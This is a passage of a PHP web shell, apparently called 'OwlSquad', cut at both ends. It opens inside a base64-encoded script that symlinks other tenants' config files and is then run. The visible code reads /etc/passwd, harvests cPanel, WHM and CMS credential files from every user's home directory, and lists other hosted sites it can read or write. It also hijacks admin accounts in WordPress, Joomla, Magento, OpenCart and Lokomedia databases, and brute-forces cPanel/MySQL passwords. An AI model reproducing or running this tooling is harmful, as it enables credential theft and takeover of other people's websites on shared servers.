ZXNzLictY2xpZW50cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRzdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5nLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tbWFuYWdlLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9teS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS1teS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLW15c2hvcC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictemVuY2FydC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXplbmNhcnQudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC1aQ3Nob3AudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc21mL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZjIudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW1zL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bXMudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdXAudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJ0aWNsZS9jb25maWcucGhwJywkc2l0ZXNzLictTndhaHkudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy11cDIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZl9nbG9iYWwucGhwJywkc2l0ZXNzLictNi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlL2RiLnBocCcsJHNpdGVzcy4nLTcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29ubmVjdC5waHAnLCRzaXRlc3MuJy1QSFAtRnVzaW9uLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL21rX2NvbmYucGhwJywkc2l0ZXNzLictOS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJHNpdGVzcy4nLURydXBhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXIvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy0xbWVtYmVyLnR4dCcpIDsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5ncy50eHQnKSA7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3JlcXVpcmVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy1BTTRTUy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3N1cHBvcnRzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcG9ydC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1zdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtYmlsbGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5ncy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1iaWxsaW5ncy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0L2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3QudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdHMvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdGluZy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmdzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RpbmdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RiaWxsaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RiaWxsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcC9ldGMvbG9jYWwueG1sJywkc2l0ZXNzLictTWFnZW50by50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictT3BlbmNhcnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCRzaXRlc3MuJy1QcmVzdGFzaG9wLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZy9rb25la3NpLnBocCcsJHNpdGVzcy4nLUxva29tZWRpYS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9sb2tvbWVkaWEvY29uZmlnL2tvbmVrc2kucGhwJywkc2l0ZXNzLictTG9rb21lZGlhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NsY29uZmlnLnBocCcsJHNpdGVzcy4nLVNpdGVsb2NrLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCRzaXRlc3MuJy1FbGxpc2xhYi50eHQnKTsNCn0NCnByaW50ICJMb2NhdGlvbjogLi9cblxuIjs=";
		$file = "OwlSquad_config/vhost.cin";
		$handle = fopen($file ,"w+");
		fwrite($handle ,base64_decode($vhost));
		fclose($handle);
		chmod($file, 0755);
		if(exe("cd OwlSquad_config && ./vhost.cin")) {
			echo "<center><a href='$link_config/OwlSquad_config'><font color=#4c83af>Done</font></a></center>";
		} else {
			echo "<center><a href='$link_config/OwlSquad_config/vhost.cin'><font color=#4c83af>Done</font></a></center>";
		}

	} else {
		$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
		while($passwd = fgets($etc)) {
			if($passwd == "" || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_config);
				foreach($user_config[1] as $user_idx) {
					$user_config_dir = "/home/$user_idx/public_html/";
					if(is_readable($user_config_dir)) {
						$grab_config = array(
							"/home/$user_idx/.my.cnf" => "cpanel",
							"/home/$user_idx/.accesshash" => "WHM-accesshash",
							"$user_config_dir/po-content/config.php" => "Popoji",
							"$user_config_dir/vdo_config.php" => "Voodoo",
							"$user_config_dir/bw-configs/config.ini" => "BosWeb",
							"$user_config_dir/config/koneksi.php" => "Lokomedia",
							"$user_config_dir/lokomedia/config/koneksi.php" => "Lokomedia",
							"$user_config_dir/clientarea/configuration.php" => "WHMCS",
							"$user_config_dir/whm/configuration.php" => "WHMCS",
							"$user_config_dir/whmcs/configuration.php" => "WHMCS",
							"$user_config_dir/forum/config.php" => "phpBB",
							"$user_config_dir/sites/default/settings.php" => "Drupal",
							"$user_config_dir/config/settings.inc.php" => "PrestaShop",
							"$user_config_dir/app/etc/local.xml" => "Magento",
							"$user_config_dir/joomla/configuration.php" => "Joomla",
							"$user_config_dir/configuration.php" => "Joomla",
							"$user_config_dir/wp/wp-config.php" => "WordPress",
							"$user_config_dir/wordpress/wp-config.php" => "WordPress",
							"$user_config_dir/wp-config.php" => "WordPress",
							"$user_config_dir/admin/config.php" => "OpenCart",
							"$user_config_dir/slconfig.php" => "Sitelok",
							"$user_config_dir/application/config/database.php" => "Ellislab");
						foreach($grab_config as $config => $nama_config) {
							$ambil_config = file_get_contents($config);
							if($ambil_config == '') {
							} else {
								$file_config = fopen("OwlSquad_config/$user_idx-$nama_config.txt","w");
								fputs($file_config,$ambil_config);
							}
						}
					}		
				}
			}	
		}
	echo "<center><a href='?dir=$dir/OwlSquad_config'><font color=#4c83af>Done</font></a></center>";
	}
} elseif($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=#4c83af>R</font>] <a href='?dir=$url_user'><font color=#4c83af>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=#4c83af>RW</font>] <a href='?dir=$url_user'><font color=#4c83af>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Domain di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts|vhost/", $dir)) {
		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace("www.", "", $url);
				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=#4c83af>R</font>] <a href='?dir=$web_vh'><font color=#4c83af>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=#4c83af>RW</font>] <a href='?dir=$web_vh'><font color=#4c83af>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=#4c83af>R</font>] <a href='?dir=$user_jumping_dir'><font color=#4c83af>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=#4c83af>RW</font>] <a href='?dir=$user_jumping_dir'><font color=#4c83af>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
} elseif($_GET['do'] == 'auto_edit_user') {
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=#4c83af>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=#4c83af>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=#4c83af>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=#4c83af>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=#4c83af>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='berandal' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='berandal' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
} elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
									$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=#4c83af>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "username (<font color=#4c83af>$ucp</font>) password (<font color=#4c83af>$pcp</font>) domain ($dom)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=#4c83af>OwlSquad.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
